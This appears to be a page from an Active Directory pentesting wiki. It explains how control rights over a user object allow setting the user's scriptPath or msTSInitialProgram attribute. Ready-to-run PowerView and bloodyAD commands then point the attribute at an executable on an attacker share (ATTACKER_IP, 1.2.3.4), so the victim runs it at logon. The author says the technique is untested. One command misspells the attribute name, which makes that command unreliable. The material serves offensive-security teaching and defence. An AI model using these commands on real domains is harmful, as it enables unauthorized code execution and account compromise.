# Logon script

{% hint style="danger" %}
It is worth noting that during my tests, I couldn't find a way to practice this scenario. Since I didn't find practical enough resources on the Internet, feel free to reach out if you manage to exploit this.
{% endhint %}

This abuse can be carried out when controlling an object that has a `GenericAll` or `GenericWrite` over the target, or a `WriteProperty` premission over the target's logon script attribute (i.e. `scriptPath` or `msTSInitialProgram`).

The attacker can make the user execute a custom script at logon.

{% tabs %}
{% tab title="Windows" %}
This can be achieved with [Set-DomainObject](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/) ([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module).

```bash

Set-DomainObject testuser -Set @{'msTSTnitialProgram'='\\ATTACKER_IP\share\run_at_logon.exe'} -Verbose

Set-DomainObject testuser -Set @{'scriptPath'='\\ATTACKER_IP\share\run_at_logon.exe'} -Verbose
```
{% endtab %}

{% tab title="Windows/UNIX-like" %}
It can also be achieved with a python tool as [bloodyAD](https://github.com/CravateRouge/bloodyAD).
```bash
bloodyAD --host 10.10.10.10 -d example.lab -u hacker -p MyPassword123 set object vulnerable_user msTSInitialProgram -v '\\1.2.3.4\share\file.exe'
bloodyAD --host 10.10.10.10 -d example.lab -u hacker -p MyPassword123 set object vulnerable_user msTSWorkDirectory -v 'C:\'

# or
bloodyAD --host 10.10.10.10 -d example.lab -u hacker -p MyPassword123 set object vulnerable_user scriptPath -v '\\1.2.3.4\share\file.exe'
```
{% endtab %}

{% endtabs %}